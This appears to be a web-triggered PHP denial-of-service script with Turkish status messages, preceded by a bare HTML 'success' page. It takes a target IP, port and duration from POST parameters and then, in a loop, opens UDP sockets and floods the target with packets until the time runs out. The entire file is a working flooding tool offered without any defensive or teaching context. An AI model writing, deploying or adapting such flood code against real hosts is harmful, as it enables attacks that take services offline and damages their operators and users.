<html><body>success</body></html>
<?php
$targetIp = $_POST['targetIp']; 
$targetPort = $_POST['targetPort'];    
$message = "BOF"; 
$durationUdp = $_POST['durationUdp']; 

$startTime = time();
$endTime = $startTime + $durationUdp; 

while (time() < $endTime) {
    $socket = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP); 
    
    if ($socket === false) {
        echo "UDP soketi oluşturulamadı: " . socket_strerror(socket_last_error()) . "\n";
    }
    
    $result = socket_sendto($socket, $message, strlen($message), 0, $targetIp, $targetPort);
    
    if ($result === false) {
        echo "UDP paketi gönderilemedi: " . socket_strerror(socket_last_error()) . "\n";
    } else {
        echo "UDP paketi başarıyla gönderildi.\n";
    }
    
    socket_close($socket); 
}
echo "Süre boyunca istekler başarıyla gönderildi.";
?>
